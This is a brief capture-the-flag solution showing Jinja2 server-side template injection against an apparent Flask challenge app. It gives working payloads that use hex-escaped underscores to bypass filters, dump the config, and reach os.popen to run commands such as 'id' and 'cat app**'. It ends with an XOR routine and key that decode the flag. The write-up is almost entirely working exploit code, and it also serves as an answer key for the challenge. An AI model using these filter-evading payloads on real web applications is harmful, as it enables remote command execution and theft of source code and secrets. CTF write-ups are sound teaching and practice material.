# Solution

Step 1, get the config

``` python
{{self|attr("\x5f\x5fdict\x5f\x5f")}}
```

Step 2, get the app source code


``` python
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("id")|attr("read")()}}
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("cat app**")|attr("read")()}}
```

Step 3, run it yourself!

``` python
def magic(flag, key): 
    return ''.join(chr(x ^ ord(flag[x]) ^ ord(key[x]) ^ ord(key[::-1][x])) for x in range(len(flag)))

flag="C\x1eS\x1dwsef}j\x057i\x7fo{D)'dO,+sutm3F"
magic(flag, '46e505c983433b7c8eefb953d3ffcd196a08bbf9')
```
 
